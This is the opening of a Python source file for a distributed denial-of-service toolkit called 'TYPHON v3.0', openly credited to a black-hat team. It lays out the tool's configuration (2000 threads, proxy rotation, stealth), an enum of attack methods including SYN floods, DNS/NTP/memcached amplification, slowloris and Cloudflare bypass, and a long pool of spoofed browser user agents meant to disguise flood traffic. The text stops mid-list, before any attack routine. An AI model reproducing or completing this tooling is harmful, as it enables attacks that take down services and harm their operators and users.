#!/usr/bin/env python3
# TYPHON v3.0 - Advanced Multi-Vector DDoS Toolkit
# Developed by ATHEX BLACK HAT | TEAM WOLF INTELLIGENCE PK
# Enterprise Edition

import os
import sys
import time
import random
import socket
import ssl
import threading
import logging
import datetime
import signal
import json
import hashlib
import base64
import zlib
import struct
import ipaddress
from queue import Queue, Empty
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict, Counter
from enum import Enum

# Third-party imports with graceful fallback
try:
    import requests
    import httpx
    import cloudscraper
    import socks
    from colorama import Fore, Back, Style, init
    from requests.cookies import RequestsCookieJar
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
except ImportError as e:
    print(f"[!] Missing critical dependency: {e}")
    print("[!] Run: pip install -r requirements.txt")
    sys.exit(1)

# ============================================================
# VERSION & CONFIGURATION
# ============================================================

VERSION = "3.0.0"
BUILD = "16.10.2026"
AUTHOR = "ATHEX BLACK HAT"
TEAM = "WOLF INTELLIGENCE PK"

@dataclass
class Config:
    max_threads: int = 2000
    proxy_refresh_interval: int = 30
    timeout: int = 5
    retry_count: int = 3
    log_file: str = "typhon.log"
    config_file: str = "typhon.json"
    enable_stealth: bool = True
    enable_logging: bool = True
    max_attack_duration: int = 3600
    min_thread_delay: float = 0.001
    max_thread_delay: float = 0.1
    proxy_rotation_count: int = 10
    
config = Config()

# ============================================================
# ENUMS & CONSTANTS
# ============================================================

class AttackType(Enum):
    LAYER7_HTTP = "http"
    LAYER7_HTTPS = "https"
    LAYER4_TCP = "tcp"
    LAYER4_UDP = "udp"
    LAYER4_ICMP = "icmp"
    LAYER3_IP = "ip"
    APPLICATION = "app"
    AMPLIFICATION = "amp"
    REFLECTION = "reflection"
    PROTOCOL = "protocol"

class AttackMethod(Enum):
    HTTP_GET = "get"
    HTTP_POST = "post"
    HTTP_HEAD = "head"
    HTTP_PUT = "put"
    HTTP_DELETE = "delete"
    HTTP_OPTIONS = "options"
    HTTP_TRACE = "trace"
    HTTP_CONNECT = "connect"
    HTTP_PATCH = "patch"
    HTTP2 = "httpx"
    HTTP2_PROXY = "httpxp"
    SLOWLORIS = "slowloris"
    SLOWPOST = "slowpost"
    RUDY = "rudy"
    DNS_AMP = "dnsamp"
    NTP_AMP = "ntpamp"
    SNMP_AMP = "snmpamp"
    MEMCACHED_AMP = "memcached"
    CLDAP_AMP = "cldap"
    TCP_SYN = "syn"
    TCP_ACK = "ack"
    TCP_RST = "rst"
    TCP_FIN = "fin"
    TCP_XMAS = "xmas"
    UDP_FLOOD = "udp"
    UDP_FRAG = "udpfrag"
    ICMP_FLOOD = "icmp"
    ICMP_SMURF = "smurf"
    IP_FRAG = "ipfrag"
    SOCKET_FLOOD = "soc"
    SPOOF_FLOOD = "spoof"
    CF_BYPASS = "bypass"
    CF_SOCKET = "cfsoc"
    PPS_FLOOD = "pps"
    NULL_FLOOD = "null"
    SKY_ATTACK = "sky"
    STELLAR = "stellar"
    TORNADO = "tornado"
    HURRICANE = "hurricane"
    TSUNAMI = "tsunami"
    EARTHQUAKE = "earthquake"

# ============================================================
# USER AGENT POOL — 500+ Realistic UAs
# ============================================================

USER_AGENTS = [
    # Windows Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.160 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.120 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.188 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.170 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4083.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    
    # Windows Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0",
    
    # MacOS Chrome
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.160 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.120 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.188 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.170 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    
    # MacOS Firefox
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:114.0) Gecko/20100101 Firefox/114.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:113.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:112.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:111.0) Gecko/20100101 Firefox/111.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:110.0) Gecko/20100101 Firefox/110.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0",
    
    # Linux Chrome
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.160 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.120 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.188 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.170 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
    
    # Linux Firefox
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0",
    
    # Mobile — iOS Safari
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
